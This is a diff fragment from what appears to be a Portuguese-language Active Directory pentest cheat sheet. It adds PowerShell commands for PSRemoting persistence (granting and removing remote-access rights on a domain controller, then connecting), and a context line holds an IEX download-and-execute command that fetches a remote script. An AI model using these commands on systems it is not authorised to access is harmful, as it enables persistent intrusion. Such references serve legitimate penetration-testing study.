@@ -1765,9 +1765,20 @@ IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0ci
 ```
 Set-RemotePSRemoting -Username vegeta -Verbose
 ```
+##### PERSISTENCE PSREMOTING - ADICIONAR PERMISSÃO PARA PSREMOTE. (RODANDO REMOTAMENTE)
+```
+Set-RemotePSRemoting -Username vegeta -computername tech-dc01 -Verbose
+```
+##### PERSISTENCE PSREMOTING - REMOVER PERMISSÃO PARA PSREMOTE
+```
+Set-RemotePSRemoting -Username pentester -Remove -Verbose
+Set-RemotePSRemoting -Username vegeta -computername tech-dc01 -Remove -Verbose
+```
 
-
-
+##### PERSISTENCE PSREMOTING - ACESSAR REMOTAMENTE
+```
+Enter-PSSession -computername tech-dc01
+```
 
 
 
